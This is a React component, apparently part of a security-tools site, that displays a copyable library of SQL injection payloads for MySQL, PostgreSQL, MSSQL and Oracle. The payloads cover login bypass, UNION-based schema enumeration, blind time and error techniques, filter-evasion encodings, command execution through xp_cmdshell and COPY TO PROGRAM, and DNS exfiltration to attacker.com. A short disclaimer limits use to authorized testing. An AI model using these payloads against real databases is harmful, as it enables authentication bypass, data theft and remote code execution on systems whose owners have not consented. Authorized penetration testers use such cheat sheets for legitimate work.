import React, { useState, useMemo } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import { Database, Copy, Check, Filter, AlertTriangle, Code, Zap, Shield, Server, Clock } from 'lucide-react';

const SQLiPayloads = () => {
    const [search, setSearch] = useState('');
    const [activeCategory, setActiveCategory] = useState('all');
    const [activeDB, setActiveDB] = useState('all');
    const [copied, setCopied] = useState(null);

    const payloads = [
        // MySQL - Auth Bypass
        { name: 'Basic OR Bypass', payload: `' OR '1'='1`, category: 'Auth Bypass', db: 'MySQL' },
        { name: 'Comment Bypass', payload: `' OR '1'='1' -- `, category: 'Auth Bypass', db: 'MySQL' },
        { name: 'Hash Comment', payload: `' OR '1'='1' #`, category: 'Auth Bypass', db: 'MySQL' },
        { name: 'Admin Bypass', payload: `admin' --`, category: 'Auth Bypass', db: 'MySQL' },
        { name: 'Always True', payload: `' OR 1=1 --`, category: 'Auth Bypass', db: 'Universal' },

        // UNION Attacks
        { name: 'UNION NULL Test', payload: `' UNION SELECT NULL--`, category: 'UNION', db: 'Universal' },
        { name: 'UNION 2 Columns', payload: `' UNION SELECT NULL,NULL--`, category: 'UNION', db: 'Universal' },
        { name: 'UNION 3 Columns', payload: `' UNION SELECT NULL,NULL,NULL--`, category: 'UNION', db: 'Universal' },
        { name: 'UNION Version', payload: `' UNION SELECT @@version--`, category: 'UNION', db: 'MySQL' },
        { name: 'UNION User', payload: `' UNION SELECT user()--`, category: 'UNION', db: 'MySQL' },
        { name: 'UNION Database', payload: `' UNION SELECT database()--`, category: 'UNION', db: 'MySQL' },
        { name: 'UNION Tables', payload: `' UNION SELECT NULL, table_name FROM information_schema.tables--`, category: 'UNION', db: 'MySQL' },
        { name: 'UNION Columns', payload: `' UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name='users'--`, category: 'UNION', db: 'MySQL' },

        // Time-Based Blind
        { name: 'MySQL SLEEP', payload: `' AND SLEEP(5)--`, category: 'Time-Based', db: 'MySQL' },
        { name: 'MySQL Nested SLEEP', payload: `' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--`, category: 'Time-Based', db: 'MySQL' },
        { name: 'MySQL IF SLEEP', payload: `' OR IF(1=1, SLEEP(5), 0)--`, category: 'Time-Based', db: 'MySQL' },
        { name: 'PostgreSQL Sleep', payload: `' AND pg_sleep(5)--`, category: 'Time-Based', db: 'PostgreSQL' },
        { name: 'MSSQL WAITFOR', payload: `' WAITFOR DELAY '00:00:05'--`, category: 'Time-Based', db: 'MSSQL' },

        // Error-Based
        { name: 'MySQL ExtractValue', payload: `' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT @@version)))--`, category: 'Error-Based', db: 'MySQL' },
        { name: 'MySQL UpdateXML', payload: `' AND UPDATEXML(1, CONCAT(0x7e, (SELECT user())), 1)--`, category: 'Error-Based', db: 'MySQL' },

        // Filter Bypass
        { name: 'Space Bypass /**/', payload: `'/**/OR/**/1=1--`, category: 'Bypass', db: 'Universal' },
        { name: 'Case Variation', payload: `' UnIoN SeLeCt NULL--`, category: 'Bypass', db: 'Universal' },
        { name: 'URL Encode (%)', payload: `' %55NION %53ELECT NULL--`, category: 'Bypass', db: 'Universal' },
        { name: 'MySQL Comment', payload: `' /*!UNION*/ /*!SELECT*/ NULL--`, category: 'Bypass', db: 'MySQL' },
        { name: 'Double URL Encode', payload: `%2527%2520OR%25201%253D1--`, category: 'Bypass', db: 'Universal' },

        // PostgreSQL Specific
        { name: 'PG Version', payload: `' UNION SELECT version()--`, category: 'UNION', db: 'PostgreSQL' },
        { name: 'PG Current DB', payload: `' UNION SELECT current_database()--`, category: 'UNION', db: 'PostgreSQL' },
        { name: 'PG Current User', payload: `' UNION SELECT current_user--`, category: 'UNION', db: 'PostgreSQL' },
        { name: 'PG Command Exec', payload: `'; COPY (SELECT '') TO PROGRAM 'curl http://attacker.com'--`, category: 'RCE', db: 'PostgreSQL' },

        // MSSQL Specific
        { name: 'MSSQL Version', payload: `' UNION SELECT @@version--`, category: 'UNION', db: 'MSSQL' },
        { name: 'MSSQL xp_cmdshell', payload: `'; EXEC xp_cmdshell('whoami')--`, category: 'RCE', db: 'MSSQL' },
        { name: 'MSSQL Databases', payload: `' UNION SELECT NULL, name FROM sys.databases--`, category: 'UNION', db: 'MSSQL' },
        { name: 'MSSQL Tables', payload: `' UNION SELECT NULL, name FROM sys.tables--`, category: 'UNION', db: 'MSSQL' },

        // Oracle Specific
        { name: 'Oracle DUAL', payload: `' UNION SELECT NULL FROM dual--`, category: 'UNION', db: 'Oracle' },
        { name: 'Oracle Banner', payload: `' UNION SELECT banner FROM v$version--`, category: 'UNION', db: 'Oracle' },
        { name: 'Oracle User', payload: `' UNION SELECT user FROM dual--`, category: 'UNION', db: 'Oracle' },
        { name: 'Oracle Tables', payload: `' UNION SELECT NULL, table_name FROM all_tables--`, category: 'UNION', db: 'Oracle' },

        // Out-of-Band
        { name: 'MySQL DNS Exfil', payload: `' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',@@version,'.attacker.com\\\\a'))--`, category: 'OOB', db: 'MySQL' },
        { name: 'MSSQL DNS Exfil', payload: `'; EXEC master..xp_dirtree '\\\\attacker.com\\a'--`, category: 'OOB', db: 'MSSQL' },
    ];

    const categories = ['all', 'Auth Bypass', 'UNION', 'Time-Based', 'Error-Based', 'Bypass', 'RCE', 'OOB'];
    const databases = ['all', 'Universal', 'MySQL', 'PostgreSQL', 'MSSQL', 'Oracle'];

    const filteredPayloads = useMemo(() => {
        return payloads.filter(p => {
            const matchesCategory = activeCategory === 'all' || p.category === activeCategory;
            const matchesDB = activeDB === 'all' || p.db === activeDB;
            const matchesSearch = p.name.toLowerCase().includes(search.toLowerCase()) ||
                p.payload.toLowerCase().includes(search.toLowerCase());
            return matchesCategory && matchesDB && matchesSearch;
        });
    }, [search, activeCategory, activeDB]);

    const copyToClipboard = (payload, idx) => {
        navigator.clipboard.writeText(payload);
        setCopied(idx);
        setTimeout(() => setCopied(null), 2000);
    };

    const getCategoryColor = (cat) => {
        switch (cat) {
            case 'Auth Bypass': return 'bg-green-500/10 text-green-400 border-green-500/30';
            case 'UNION': return 'bg-blue-500/10 text-blue-400 border-blue-500/30';
            case 'Time-Based': return 'bg-purple-500/10 text-purple-400 border-purple-500/30';
            case 'Error-Based': return 'bg-orange-500/10 text-orange-400 border-orange-500/30';
            case 'Bypass': return 'bg-yellow-500/10 text-yellow-400 border-yellow-500/30';
            case 'RCE': return 'bg-red-500/10 text-red-400 border-red-500/30';
            case 'OOB': return 'bg-cyan-500/10 text-cyan-400 border-cyan-500/30';
            default: return 'bg-white/10 text-white/60 border-white/30';
        }
    };

    const getDBColor = (db) => {
        switch (db) {
            case 'MySQL': return 'text-blue-400';
            case 'PostgreSQL': return 'text-cyan-400';
            case 'MSSQL': return 'text-red-400';
            case 'Oracle': return 'text-orange-400';
            default: return 'text-white/40';
        }
    };

    return (
        <div className="max-w-6xl mx-auto space-y-12 animate-fade-in">
            {/* Header */}
            <div className="text-center space-y-4">
                <h1 className="text-5xl font-black italic tracking-tighter flex items-center justify-center gap-4 underline decoration-blue-500/50 underline-offset-8">
                    <Database size={48} className="text-blue-500" />
                    SQL INJECTION
                </h1>
                <p className="text-white/40 font-mono tracking-[0.3em] uppercase text-sm">SQL Injection payload library</p>
            </div>

            {/* Search */}
            <div className="p-6 rounded-2xl bg-white/5 border border-white/10">
                <input
                    type="text"
                    value={search}
                    onChange={(e) => setSearch(e.target.value)}
                    placeholder="Search payloads..."
                    className="w-full p-4 bg-black/40 border border-white/10 rounded-xl text-white focus:border-blue-500/50 outline-none"
                />
            </div>

            {/* Filters */}
            <div className="space-y-4">
                <div className="flex items-center gap-2 text-xs text-white/40">
                    <Filter size={14} /> CATEGORY
                </div>
                <div className="flex flex-wrap gap-2">
                    {categories.map(cat => (
                        <button
                            key={cat}
                            onClick={() => setActiveCategory(cat)}
                            className={`px-4 py-2 rounded-xl text-xs font-bold uppercase transition-all border ${activeCategory === cat ? 'bg-blue-500/20 text-blue-400 border-blue-500/50' : 'bg-white/5 text-white/40 border-white/10 hover:border-white/30'}`}
                        >
                            {cat === 'all' ? 'All' : cat}
                        </button>
                    ))}
                </div>

                <div className="flex items-center gap-2 text-xs text-white/40 mt-4">
                    <Server size={14} /> DATABASE
                </div>
                <div className="flex flex-wrap gap-2">
                    {databases.map(db => (
                        <button
                            key={db}
                            onClick={() => setActiveDB(db)}
                            className={`px-4 py-2 rounded-xl text-xs font-bold uppercase transition-all border ${activeDB === db ? 'bg-blue-500/20 text-blue-400 border-blue-500/50' : 'bg-white/5 text-white/40 border-white/10 hover:border-white/30'}`}
                        >
                            {db === 'all' ? 'All DBs' : db}
                        </button>
                    ))}
                </div>
            </div>

            {/* Payloads List */}
            <div className="space-y-3">
                <AnimatePresence>
                    {filteredPayloads.map((p, idx) => (
                        <motion.div
                            key={p.name + p.db}
                            initial={{ opacity: 0, y: 10 }}
                            animate={{ opacity: 1, y: 0 }}
                            exit={{ opacity: 0, y: -10 }}
                            transition={{ delay: idx * 0.02 }}
                            className="p-4 rounded-2xl bg-white/5 border border-white/10 hover:border-blue-500/30 transition-all group"
                        >
                            <div className="flex items-center justify-between gap-4">
                                <div className="flex items-center gap-3 flex-1 min-w-0">
                                    <span className={`px-2 py-1 rounded-lg text-[10px] font-bold uppercase border ${getCategoryColor(p.category)}`}>
                                        {p.category}
                                    </span>
                                    <span className="font-bold text-white truncate">{p.name}</span>
                                    <span className={`text-[10px] font-bold ${getDBColor(p.db)}`}>{p.db}</span>
                                </div>
                                <button
                                    onClick={() => copyToClipboard(p.payload, idx)}
                                    className={`p-2 rounded-lg transition-all ${copied === idx ? 'bg-green-500 text-white' : 'bg-white/10 text-white/60 hover:bg-white/20'}`}
                                >
                                    {copied === idx ? <Check size={16} /> : <Copy size={16} />}
                                </button>
                            </div>
                            <div className="mt-3 p-3 bg-black/40 rounded-xl font-mono text-xs text-blue-300 overflow-x-auto">
                                {p.payload}
                            </div>
                        </motion.div>
                    ))}
                </AnimatePresence>
            </div>

            {filteredPayloads.length === 0 && (
                <div className="text-center py-16 text-white/30">
                    No payloads found matching your criteria.
                </div>
            )}

            {/* Disclaimer */}
            <div className="p-4 rounded-xl bg-red-500/5 border border-red-500/20 text-center">
                <p className="text-xs text-red-400/80">
                    <AlertTriangle size={14} className="inline mr-2" />
                    For authorized security testing and educational purposes only. Unauthorized use is illegal.
                </p>
            </div>
        </div>
    );
};

export default SQLiPayloads;
